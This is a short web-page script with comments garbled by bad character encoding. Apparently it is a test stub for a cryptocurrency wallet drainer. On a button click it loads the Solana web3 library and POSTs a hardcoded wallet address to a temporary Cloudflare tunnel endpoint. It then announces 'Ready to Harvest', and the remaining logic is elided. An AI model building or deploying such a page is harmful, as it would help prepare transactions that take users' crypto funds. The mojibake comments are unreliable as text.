<script>
    // ðŸ”± æš´åŠ›å†™æ­»ï¼šç›´æŽ¥ç”¨ä½ åˆšæ‰é‡å¯ç”Ÿæˆçš„æœ€æ–°åœ°å€ï¼Œä¸èµ° Vercel å˜é‡
    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com"; 

    document.getElementById('cta').onclick = async () => {
        const log = (t) => document.getElementById('status').innerText = t;
        const sWeb3 = window.solanaWeb3;
        
        // å¢žåŠ æ›´ç›´è§‚çš„é”™è¯¯æ£€æµ‹
        try {
            log("FETCHING...");
            const resp = await fetch(tunnel + "/prepare_v32", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A" }) // ä¸´æ—¶å¡«ä¸€ä¸ªåœ°å€æµ‹é€š
            }).catch(e => { throw new Error("Tunnel Offline or Blocked"); });

            if (!resp.ok) throw new Error("Server 500 Error");
            
            const info = await resp.json();
            alert("Connection Success! Ready to Harvest."); 
            // ... å‰©ä½™é€»è¾‘
        } catch (err) {
            alert("DIAGNOSTIC: " + err.message + "\nURL: " + tunnel);
        }
    };
</script>
